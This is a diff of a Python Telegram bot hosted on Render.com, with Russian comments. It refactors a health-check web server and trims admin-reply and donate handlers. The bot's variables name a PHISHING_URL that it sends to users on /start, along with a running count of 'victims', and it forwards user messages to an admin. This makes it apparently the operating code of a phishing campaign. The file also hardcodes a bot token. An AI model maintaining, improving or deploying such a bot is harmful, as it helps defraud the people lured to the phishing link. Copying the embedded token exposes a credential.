@@ -2,8 +2,8 @@ import requests
 import time
 import json
 import threading
-from http.server import HTTPServer, BaseHTTPRequestHandler
 import os
+from http.server import HTTPServer, BaseHTTPRequestHandler
 
 BOT_TOKEN = "8601549576:AAHLJF0oPN6Sx6jQRpfuHz-Stl3Fri_6LxI"
 ADMIN_ID = 8744429026
@@ -128,33 +128,41 @@ def get_reply_keyboard(user_id, username):
         [{"text": "✏️ Ответить пользователю", "callback_data": f"reply_{user_id}_{username}"}]
     ]
 
-def get_reply_message_keyboard(reply_to_user_id, reply_to_username):
-    return [
-        [{"text": "📤 Отправить ответ", "callback_data": f"send_reply_{reply_to_user_id}"}],
-        [{"text": "❌ Отмена", "callback_data": "cancel_reply"}]
-    ]
-
-# === ВЕБ-СЕРВЕР ДЛЯ RENDER ===
+# ========== ВЕБ-СЕРВЕР ДЛЯ RENDER (ФИКС) ==========
 class HealthHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         self.send_response(200)
         self.end_headers()
         self.wfile.write(b'Bot is running')
+    
+    def log_message(self, format, *args):
+        # Отключаем логи веб-сервера, чтобы не засорять вывод
+        pass
 
 def run_health_server():
+    # Render ожидает порт 10000
     port = int(os.environ.get('PORT', 10000))
-    server = HTTPServer(('0.0.0.0', port), HealthHandler)
-    server.serve_forever()
+    try:
+        server = HTTPServer(('0.0.0.0', port), HealthHandler)
+        server.serve_forever()
+    except Exception as e:
+        print(f"Веб-сервер остановлен: {e}")
 
-threading.Thread(target=run_health_server, daemon=True).start()
+# Запускаем веб-сервер в отдельном потоке
+web_thread = threading.Thread(target=run_health_server, daemon=True)
+web_thread.start()
+
+# Даём время на запуск веб-сервера
+time.sleep(2)
 
 print("✅ Бот запущен на Render.com!")
 print(f"🔗 Ссылка: {PHISHING_URL}")
+print(f"👑 Администратор: {ADMIN_ID}")
+print(f"🌐 Веб-сервер запущен на порту {os.environ.get('PORT', 10000)}")
 
-# Временное хранилище для ответов администратора
+# ========== ОСНОВНОЙ ЦИКЛ БОТА ==========
 admin_reply_context = {}
 
-# === ОСНОВНОЙ ЦИКЛ БОТА ===
 while True:
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={last_update_id + 1}&timeout=10"
@@ -177,15 +185,12 @@ while True:
                         user_language[chat_id] = 'ru'
                         send_message(chat_id, get_text(chat_id, 'start', url=PHISHING_URL, count=len(victims)), get_main_keyboard(chat_id))
                     
-                    # Если админ находится в режиме ответа пользователю
                     elif chat_id in admin_reply_context and admin_reply_context[chat_id].get("waiting_reply"):
                         target_user_id = admin_reply_context[chat_id]["user_id"]
                         target_username = admin_reply_context[chat_id]["username"]
-                        # Отправляем ответ пользователю
                         send_message(target_user_id, f"📩 **Ответ от администратора:**\n\n{text}")
                         send_message(chat_id, f"✅ Ответ отправлен пользователю @{target_username} (ID: {target_user_id})")
                         admin_reply_context[chat_id] = {}
-                    
                 else:
                     # Обычный пользователь
                     if text == "/start":
@@ -196,7 +201,6 @@ while True:
                             f"🔹 По всем вопросам пиши — ответят в ближайшее время.\n\n{get_text(chat_id, 'admin_help')}",
                             get_main_keyboard(chat_id))
                     else:
-                        # Пересылаем сообщение админу с кнопкой ответа
                         forward_text = get_text(ADMIN_ID, 'new_message', user_id=chat_id, username=username, text=text)
                         keyboard = get_reply_keyboard(chat_id, username)
                         send_message(ADMIN_ID, forward_text, keyboard)
@@ -208,15 +212,12 @@ while True:
                 data = callback.get("data")
                 callback_id = callback.get("id")
                 message_id = callback.get("message", {}).get("message_id")
-                username = callback.get("from", {}).get("username", "нет")
-                message_text = callback.get("message", {}).get("text", "")
 
                 if data == "contact_admin":
                     send_message(chat_id, "📩 **Напиши своё сообщение ниже**\n\nАдминистратор ответит в этот чат.")
                     answer_callback(callback_id)
                 
                 elif data.startswith("reply_"):
-                    # Админ отвечает пользователю
                     parts = data.split("_")
                     if len(parts) >= 3:
                         target_user_id = int(parts[1])
@@ -224,12 +225,6 @@ while True:
                         admin_reply_context[chat_id] = {"waiting_reply": True, "user_id": target_user_id, "username": target_username}
                         send_message(chat_id, f"✏️ **Ответ пользователю @{target_username}**\n\nНапиши текст ответа ниже:")
                         answer_callback(callback_id)
-                
-                elif data == "cancel_reply":
-                    if chat_id in admin_reply_context:
-                        admin_reply_context[chat_id] = {}
-                    send_message(chat_id, "❌ Отправка ответа отменена.")
-                    answer_callback(callback_id)
                 
                 elif data == "back":
                     edit_message(chat_id, message_id, 
@@ -279,10 +274,6 @@ while True:
                         get_back_keyboard(chat_id))
                     answer_callback(callback_id)
 
-                elif data == "donate_menu":
-                    edit_message(chat_id, message_id, get_text(chat_id, 'donate'), get_donate_keyboard(chat_id))
-                    answer_callback(callback_id)
-
                 else:
                     answer_callback(callback_id)
 
@@ -291,4 +282,3 @@ while True:
     except Exception as e:
         print(f"Ошибка: {e}")
         time.sleep(5)
-        
